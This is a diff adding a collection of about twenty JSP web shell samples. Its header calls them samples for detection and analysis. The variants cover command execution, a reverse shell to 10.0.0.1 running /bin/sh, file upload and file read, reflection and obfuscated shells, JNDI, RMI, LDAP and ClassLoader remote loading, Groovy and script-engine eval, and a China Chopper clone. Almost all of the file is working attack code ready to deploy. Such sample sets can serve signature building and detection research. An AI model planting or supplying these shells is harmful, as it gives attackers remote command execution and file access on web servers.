@@ -1,0 +1,232 @@
+# JSP Web Shells
+# Java Server Pages web shell samples for detection and analysis
+
+# Basic JSP Shell
+<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
+<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>
+
+# JSP Command Execution
+<%@ page import="java.io.*" %>
+<%
+String cmd = request.getParameter("cmd");
+Process p = Runtime.getRuntime().exec(cmd);
+InputStream in = p.getInputStream();
+BufferedReader reader = new BufferedReader(new InputStreamReader(in));
+String line;
+while((line = reader.readLine()) != null){
+    out.println(line);
+}
+%>
+
+# JSP ProcessBuilder Shell
+<%@ page import="java.io.*" %>
+<%
+ProcessBuilder pb = new ProcessBuilder(request.getParameter("cmd").split(" "));
+Process p = pb.start();
+BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+String line;
+while((line = reader.readLine()) != null){
+    out.println(line);
+}
+%>
+
+# JSP Reverse Shell
+<%@ page import="java.io.*,java.net.*" %>
+<%
+Socket s = new Socket("10.0.0.1", 1234);
+Process p = Runtime.getRuntime().exec("/bin/sh");
+InputStream pi = p.getInputStream();
+InputStream pe = p.getErrorStream();
+InputStream si = s.getInputStream();
+OutputStream po = p.getOutputStream();
+OutputStream so = s.getOutputStream();
+while(!s.isClosed()){
+    while(pi.available()>0) so.write(pi.read());
+    while(pe.available()>0) so.write(pe.read());
+    while(si.available()>0) po.write(si.read());
+    so.flush();
+    po.flush();
+    Thread.sleep(50);
+}
+%>
+
+# JSP File Upload
+<%@ page import="java.io.*" %>
+<%@ page import="org.apache.commons.fileupload.*" %>
+<%@ page import="org.apache.commons.fileupload.disk.*" %>
+<%@ page import="org.apache.commons.fileupload.servlet.*" %>
+<%
+DiskFileItemFactory factory = new DiskFileItemFactory();
+ServletFileUpload upload = new ServletFileUpload(factory);
+List items = upload.parseRequest(request);
+for(Object item : items){
+    FileItem fileItem = (FileItem)item;
+    if(!fileItem.isFormField()){
+        fileItem.write(new File(fileItem.getName()));
+    }
+}
+%>
+
+# JSP File Manager
+<%@ page import="java.io.*" %>
+<%
+String dir = request.getParameter("dir");
+if(dir != null){
+    File folder = new File(dir);
+    File[] files = folder.listFiles();
+    for(File file : files){
+        out.println(file.getName() + "<br>");
+    }
+}
+String read = request.getParameter("read");
+if(read != null){
+    BufferedReader br = new BufferedReader(new FileReader(read));
+    String line;
+    while((line = br.readLine()) != null){
+        out.println(line + "<br>");
+    }
+}
+%>
+
+# JSP Reflection Shell
+<%@ page import="java.lang.reflect.*" %>
+<%
+Class rt = Class.forName("java.lang.Runtime");
+Method gr = rt.getMethod("getRuntime");
+Method ex = rt.getMethod("exec", String.class);
+ex.invoke(gr.invoke(null), request.getParameter("cmd"));
+%>
+
+# JSP Expression Language Shell
+${Runtime.getRuntime().exec(param.cmd)}
+${"".getClass().forName("java.lang.Runtime").getRuntime().exec(param.cmd)}
+
+# JSP ScriptEngine Shell
+<%@ page import="javax.script.*" %>
+<%
+ScriptEngineManager manager = new ScriptEngineManager();
+ScriptEngine engine = manager.getEngineByName("JavaScript");
+engine.eval(request.getParameter("script"));
+%>
+
+# JSP JNDI Shell
+<%@ page import="javax.naming.*" %>
+<%
+Context ctx = new InitialContext();
+ctx.lookup(request.getParameter("jndi"));
+%>
+
+# JSP Deserialization Shell
+<%@ page import="java.io.*" %>
+<%
+ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
+Object obj = ois.readObject();
+%>
+
+# JSP JDBC Shell
+<%@ page import="java.sql.*" %>
+<%
+Class.forName("com.mysql.jdbc.Driver");
+Connection conn = DriverManager.getConnection("jdbc:mysql://localhost/test", "root", "password");
+Statement stmt = conn.createStatement();
+ResultSet rs = stmt.executeQuery(request.getParameter("query"));
+while(rs.next()){
+    out.println(rs.getString(1));
+}
+%>
+
+# JSP ClassLoader Shell
+<%@ page import="java.net.*" %>
+<%
+URLClassLoader loader = new URLClassLoader(new URL[]{new URL(request.getParameter("url"))});
+Class clazz = loader.loadClass(request.getParameter("class"));
+clazz.newInstance();
+%>
+
+# JSP Base64 Encoded Shell
+<%@ page import="java.io.*,java.util.*" %>
+<%
+String encoded = request.getParameter("cmd");
+byte[] decoded = Base64.getDecoder().decode(encoded);
+String cmd = new String(decoded);
+Runtime.getRuntime().exec(cmd);
+%>
+
+# JSP Obfuscated Shell
+<%
+String a = "Runtime";
+String b = "getRuntime";
+String c = "exec";
+Class rt = Class.forName("java.lang." + a);
+Object runtime = rt.getMethod(b).invoke(null);
+rt.getMethod(c, String.class).invoke(runtime, request.getParameter("cmd"));
+%>
+
+# JSP China Chopper
+<%
+if(request.getParameter("pwd").equals("chopper")){
+    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
+    int a = -1;
+    byte[] b = new byte[2048];
+    out.print("<pre>");
+    while((a=in.read(b))!=-1){
+        out.println(new String(b));
+    }
+    out.print("</pre>");
+}
+%>
+
+# JSP WebShell with Authentication
+<%@ page import="java.io.*,java.security.*" %>
+<%
+String password = "5f4dcc3b5aa765d61d8327deb882cf99";
+MessageDigest md = MessageDigest.getInstance("MD5");
+byte[] hash = md.digest(request.getParameter("pass").getBytes());
+StringBuilder sb = new StringBuilder();
+for(byte b : hash){
+    sb.append(String.format("%02x", b));
+}
+if(sb.toString().equals(password)){
+    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line;
+    while((line = reader.readLine()) != null){
+        out.println(line);
+    }
+}
+%>
+
+# JSP JMX Shell
+<%@ page import="javax.management.*,javax.management.remote.*" %>
+<%
+JMXServiceURL url = new JMXServiceURL(request.getParameter("jmx"));
+JMXConnector connector = JMXConnectorFactory.connect(url);
+MBeanServerConnection connection = connector.getMBeanServerConnection();
+%>
+
+# JSP RMI Shell
+<%@ page import="java.rmi.*" %>
+<%
+Object obj = Naming.lookup(request.getParameter("rmi"));
+%>
+
+# JSP LDAP Shell
+<%@ page import="javax.naming.directory.*" %>
+<%
+DirContext ctx = new InitialDirContext();
+ctx.search(request.getParameter("ldap"), "(objectClass=*)", null);
+%>
+
+# JSP XSL Transform Shell
+<%@ page import="javax.xml.transform.*,javax.xml.transform.stream.*" %>
+<%
+TransformerFactory factory = TransformerFactory.newInstance();
+Transformer transformer = factory.newTransformer(new StreamSource(request.getParameter("xsl")));
+%>
+
+# JSP Groovy Shell
+<%@ page import="groovy.lang.*" %>
+<%
+GroovyShell shell = new GroovyShell();
+shell.evaluate(request.getParameter("groovy"));
+%>
